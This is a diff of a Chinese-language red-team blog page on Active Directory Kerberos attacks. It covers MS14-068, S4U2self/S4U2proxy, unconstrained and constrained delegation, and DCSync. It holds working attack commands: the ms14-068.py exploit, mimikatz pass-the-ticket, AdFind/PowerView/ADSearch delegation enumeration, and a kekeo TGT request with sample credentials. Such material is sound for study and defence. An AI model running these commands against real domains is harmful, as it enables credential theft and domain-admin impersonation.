@@ -930,8 +930,8 @@
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1653">利用SYSVOL还原组策略中保存的密码</a></p>
 <h3 id="MS14-068-Kerberos"><a href="#MS14-068-Kerberos" class="headerlink" title="MS14-068 Kerberos"></a>MS14-068 Kerberos</h3><p>因为攻击者不需要域 Kerberos 服务帐户 （<a target="_blank" rel="noopener" href="https://adsecurity.org/?p=483">KRBTGT</a>） NTLM 密码哈希（只能从具有域级管理员权限的域控制器访问）进行攻击。攻击者只需通过更改组成员身份来修改现有 TGT，使其有权访问 Active Directory 中的所有内容，并为 PAC 签名创建特定的无效校验和，从而导致 DC 对其进行验证。</p>
 <p><code>python ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机</code></p>
-<p>利用mimikatz将工具得到的<a href="mailto:&#x54;&#x47;&#84;&#95;&#100;&#x6f;&#x6d;&#x61;&#105;&#x6e;&#x75;&#x73;&#x65;&#x72;&#x40;&#x53;&#x45;&#82;&#x56;&#69;&#x52;&#46;&#67;&#x4f;&#77;&#x2e;&#x63;&#99;&#97;&#99;&#x68;&#x65;">&#x54;&#x47;&#84;&#95;&#100;&#x6f;&#x6d;&#x61;&#105;&#x6e;&#x75;&#x73;&#x65;&#x72;&#x40;&#x53;&#x45;&#82;&#x56;&#69;&#x52;&#46;&#67;&#x4f;&#77;&#x2e;&#x63;&#99;&#97;&#99;&#x68;&#x65;</a>写入内存，创建缓存证书：</p>
-<p>mimikatz.exe “kerberos::ptc c:<a href="mailto:&#84;&#71;&#84;&#95;&#x64;&#x61;&#114;&#x74;&#x68;&#115;&#x69;&#x64;&#105;&#111;&#117;&#115;&#x40;&#x70;&#101;&#x6e;&#x74;&#x65;&#115;&#116;&#46;&#99;&#x6f;&#109;&#46;&#99;&#x63;&#x61;&#99;&#104;&#101;">&#84;&#71;&#84;&#95;&#x64;&#x61;&#114;&#x74;&#x68;&#115;&#x69;&#x64;&#105;&#111;&#117;&#115;&#x40;&#x70;&#101;&#x6e;&#x74;&#x65;&#115;&#116;&#46;&#99;&#x6f;&#109;&#46;&#99;&#x63;&#x61;&#99;&#104;&#101;</a>“ exit</p>
+<p>利用mimikatz将工具得到的<a href="mailto:&#x54;&#71;&#x54;&#95;&#x64;&#x6f;&#109;&#97;&#x69;&#110;&#x75;&#115;&#101;&#x72;&#64;&#x53;&#69;&#x52;&#x56;&#x45;&#x52;&#x2e;&#x43;&#x4f;&#77;&#46;&#99;&#x63;&#x61;&#x63;&#x68;&#101;">&#x54;&#71;&#x54;&#95;&#x64;&#x6f;&#109;&#97;&#x69;&#110;&#x75;&#115;&#101;&#x72;&#64;&#x53;&#69;&#x52;&#x56;&#x45;&#x52;&#x2e;&#x43;&#x4f;&#77;&#46;&#99;&#x63;&#x61;&#x63;&#x68;&#101;</a>写入内存，创建缓存证书：</p>
+<p>mimikatz.exe “kerberos::ptc c:<a href="mailto:&#x54;&#x47;&#x54;&#95;&#x64;&#x61;&#114;&#x74;&#x68;&#x73;&#x69;&#x64;&#x69;&#111;&#x75;&#115;&#64;&#x70;&#x65;&#x6e;&#116;&#101;&#x73;&#x74;&#x2e;&#x63;&#111;&#109;&#46;&#x63;&#x63;&#97;&#99;&#104;&#x65;">&#x54;&#x47;&#x54;&#95;&#x64;&#x61;&#114;&#x74;&#x68;&#x73;&#x69;&#x64;&#x69;&#111;&#x75;&#115;&#64;&#x70;&#x65;&#x6e;&#116;&#101;&#x73;&#x74;&#x2e;&#x63;&#111;&#109;&#46;&#x63;&#x63;&#97;&#99;&#104;&#x65;</a>“ exit</p>
 <p>net use k: \pentest.comc$</p>
 <p>相关阅读 :</p>
 <p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=676">Kerberos的工具包PyKEK</a></p>
@@ -1084,13 +1084,9 @@
 <p>约束性委派</p>
 <p>基于资源的约束性委派</p>
 <p>KDC可以确定A是否有访问服务B的权限，这时候就得有一个方法来让KDC知道A允许B代表自己来“做事情”，这句话可能有点绕，可以多看几遍。这时候S4U2SELF与S4U2PROXY这两个东西就出现了。这两种协议在非约束性委派的机器上不会使用，只会影响约束性与基于资源的约束性这两种委派方式</p>
-<h3 id="S4U2SELF56"><a href="#S4U2SELF56" class="headerlink" title="S4U2SELF56"></a>S4U2SELF56</h3><p>S4U2SELF的作用是使得服务可以代表某个用户获得一个用来访问服务自身的票据。</p>
-<p>这个东西在TGS_REQ这个阶段中，S4U2SELF是这个数据包的一部分内容。<br>S4U2SELF一般是一个值，例如Administrator等。当配置了这个值并且服务器B获得了可转发的TICKET票据后，服务器B就可以代表Administrator进行操作。配置这个值可以自己配置，那么获得可转发的TICKET票据有什么条件呢？<br>1.一个可转发的服务器B的TGT。<br>2.当前服务器B配置了约束委派<br>3.服务B在TGS_REQ阶段设置了forwardable选项</p>
-<p>这些都能自己设置，那岂不是可以伪造任意用户对当前服务B进行操作了？其实不是的，倘若目标用户被设置成敏感账户，不能被委派，则TICKET的FLAG字段肯定没有forwardable，也就是说条件3是无法满足的，于是不能伪装成此用户。</p>
-<h3 id="S4U2PROXY"><a href="#S4U2PROXY" class="headerlink" title="S4U2PROXY"></a>S4U2PROXY</h3><p>S4U2PROXY也是在TGS_REQ阶段的一个参数。<br>S4U2PROXY可以使当前主机代表其他用户来访问其他主机，相比较于S4U2SELF，范围大了很多，当然“代表”肯定也是有限制条件的。</p>
-<p>要想使用S4U2PROXY必须得经过S4U2SELF阶段，需要获得那个可转发的TICKET,这个TICEKT会放在TGS_REQ中的additionTicket中。</p>
-<p>假设当前主机为b，接受了administrator的委派。主机B将这个TGS_REQ请求发送给KDC并获得访问其他主机例如主机C的权限。<br>上面这些是大概流程，具体需要达成的条件为：<br>1.S4U2SELF阶段生成的可转发的TICKET<br>2.在TGS_REQ阶段设置CNAME-IN-ADDL-TKT标志<br>3.在TGS_REQ阶段设置forwardable标志<br>4.如果服务1 有到服务2的非约束委派，将服务2的SPN放在sname里面。<br>S4U2proxy 必须扩展PAFORUSER结构。</p>
-<h3 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h3><p>如果admin委派服务器B来代替自己访问其他服务，则admin会先将自己的TGT发送给服务器B存储在lsass中。<code>非约束性委派不会走S4U2Self和S4U2proxy这两个协议。</code></p>
+<p><strong>用户自我服务 （</strong><em><strong>S4U2self</strong></em><strong>）：</strong>如果<strong>服务帐户</strong>的<em>用户帐户控制</em>值包含 <a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx">TRUSTED_TO_AUTH_FOR_DELEGATION</a>（T2A4D），然后它可以代表任何其他用户为自己（服务）获取TGS。</p>
+<p><strong>用户到代理服务（S4U2proxy）</strong>：<strong>服务帐户</strong>可以代表 <strong>msDS-AllowedToDelegateTo</strong> 中设置的服务的任何用户获取 TGS。 为此，它首先需要从该用户到自身的 TGS，但它可以使用 S4U2self 在请求另一个用户之前获取该 TGS。</p>
+<p>如果admin委派服务器B来代替自己访问其他服务，则admin会先将自己的TGT发送给服务器B存储在lsass中。<code>非约束性委派不会走S4U2Self和S4U2proxy这两个协议。</code></p>
 <p>现在假设这么一种情形，service1配置了非约束性委派，用户A需要委派service1来访问service2。这个service1可以是主机账户。</p>
 <p>那么非约束性委派的过程可以大概理解为：</p>
 <p>用户A向KDC申请一张可转发的用户A自己的TGT与访问service1需要的ticket。<br>用户A将第一步得到的ticket与可转发的tgt与tgt中的session key一起发送给了service1.<br>service1使用那张tgt与session key来代表用户A行使后续操作例如访问service2.</p>
@@ -1114,9 +1110,17 @@
 <li>服务1响应用户第7步骤的请求</li>
 </ol>
 <p>这个流程有一个问题：<code>TGT2</code>是不被限制的，服务1完全可以用它来请求访问任何想访问的服务。攻击其实就是利用的这点，使用从高权限账户处得到的<code>TGT</code>去获取权限。</p>
+<p>这是域管理员可以为域内的任何计算机设置的功能  。然后，每当<strong>用户</strong>登录到计算机时，  该用户的 <strong>TGT 副本</strong>都将发送到  DC 提供的 <strong>TGS</strong> 中<strong>，并保存在 LSASS 的内存中</strong>。因此，如果您在计算机上具有管理员权限，则可以<strong>转储票证并在</strong>任何计算机上模拟用户。</p>
+<p>因此，如果域管理员在激活了“不受约束委派”功能的计算机中登录，并且您在该计算机中具有本地管理员权限，您将能够转储票证并在任何地方模拟域管理员（域权限）。</p>
+<p>您可以<strong>找到具有此属性的计算机对象</strong>，检查是否 <a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx">用户帐户控制</a>属性包含[ADS_UF_TRUSTED_FOR_DELEGATION]您可以使用 LDAP 筛选器“（userAccountControl：1.2.840.113556.1.4.803：&#x3D;524288）”执行此操作</p>
+<p>如果 TGT 如果来自域控制器，则可以执行<a href=""> <strong>DCSync 攻击</strong></a>并从 DC 获取所有哈希值</p>
 <h3 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h3><p>只能模仿特定用户</p>
 <p>1、使用 Adfind <strong>查询约束委派的用户</strong>：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -h 10.10.10.8 -u redteam-iis -up Server12345 -b <span class="string">&quot;DC=redteam,DC=red&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#Powerview</span><br><span class="line">Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto</span><br><span class="line">Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto</span><br><span class="line"></span><br><span class="line">#ADSearch</span><br><span class="line">ADSearch.exe --search &quot;(&amp;(objectCategory=computer)(msds-allowedtodelegateto=*))&quot; --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json</span><br></pre></td></tr></table></figure>
+
+
 
 <p>2.利用 kekeo 请求该用户的 TGT：<code>TGT_redteam-iis@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi</code></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe </span><br><span class="line">tgt::ask /user:redteam-iis /domain:redteam.red /password:Server12345 /ticket:administrator.</span><br></pre></td></tr></table></figure>
